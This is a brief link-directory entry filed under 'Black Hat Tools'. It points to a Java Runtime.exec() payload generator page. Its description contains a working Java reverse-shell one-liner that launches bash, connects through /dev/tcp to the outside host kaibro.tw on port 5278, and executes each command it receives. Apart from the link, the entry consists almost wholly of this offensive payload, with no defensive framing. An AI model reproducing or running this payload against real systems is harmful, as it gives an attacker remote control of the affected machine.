---
title: "http://www.jackson-t.ca/runtime-exec-payloads.html"
description: "
Java

Runtime r = Runtime.getRuntime();Process p = r.exec(new String[]{\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/kaibro.tw/5278;cat <&5 | while read line; do $line 2>&5 >&5; done\"});p.waitFor();
java.lang.Runtime.exec() payload generator: 

"
external_category: "Black Hat Tools"
---[Visit Website](http://www.jackson-t.ca/runtime-exec-payloads.html)

